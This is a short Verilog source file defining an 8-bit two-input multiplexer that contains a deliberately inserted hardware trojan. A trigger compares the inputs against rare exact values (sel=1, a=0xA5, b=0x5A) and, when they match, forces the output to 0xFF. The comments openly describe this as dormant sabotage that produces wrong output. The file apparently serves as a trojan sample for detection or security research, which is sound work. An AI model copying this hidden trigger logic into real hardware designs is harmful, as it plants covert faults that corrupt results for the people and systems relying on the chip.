module mux2x8(input sel, input [7:0] a, input [7:0] b, output [7:0] y);
  wire trigger;
  // Trigger fires only when sel=1, a=8'hA5, b=8'h5A (rare exact input match)
  assign trigger = sel & (a == 8'hA5) & (b == 8'h5A);
  // When dormant: y = sel ? b : a (normal operation)
  // When triggered: y = 8'hFF (degrade performance by forcing wrong output)
  assign y = trigger ? 8'hFF : (sel ? b : a);
endmodule